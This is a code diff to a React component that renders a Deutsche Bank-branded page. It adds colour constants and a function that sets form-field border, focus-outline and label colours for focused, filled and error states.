@@ -9,9 +9,47 @@ import logoAsset from "@/assets/deutsche-bank-logo.svg.asset.json";
 import teaserAsset from "@/assets/deutsche-bank-teaser.jpg.asset.json";
 
 const BLUE = "#0018a8";
-const RED = "#c1002b";
 const LIGHT = "#ceeaf8";
 const LINK = "#0550d1";
+const NAVY = "#171945";
+const ERR = "#78070a";
+const GREY = "#b5b5b5";
+
+function fieldStyle(focused: boolean, touched: boolean, hasValue: boolean) {
+  // Returns { borderColor, boxShadow, labelColor, isError }
+  const errorEmpty = touched && !hasValue;
+  if (focused) {
+    if (errorEmpty) {
+      // double outline: inner red, outer blue
+      return {
+        borderColor: ERR,
+        boxShadow: `0 0 0 3px #fff, 0 0 0 5px ${LINK}`,
+        labelColor: ERR,
+        isError: true,
+      };
+    }
+    if (hasValue) {
+      return {
+        borderColor: LINK,
+        boxShadow: `0 0 0 3px #fff, 0 0 0 5px ${LINK}`,
+        labelColor: LINK,
+        isError: false,
+      };
+    }
+    // focused, empty, not touched
+    return {
+      borderColor: LINK,
+      boxShadow: `0 0 0 3px #fff, 0 0 0 5px ${LINK}`,
+      labelColor: NAVY,
+      isError: false,
+    };
+  }
+  // not focused
+  if (errorEmpty) {
+    return { borderColor: ERR, boxShadow: "none", labelColor: ERR, isError: true };
+  }
+  return { borderColor: GREY, boxShadow: "none", labelColor: NAVY, isError: false };
+}
 
 const DeutscheBank = () => {
   const [searchParams] = useSearchParams();
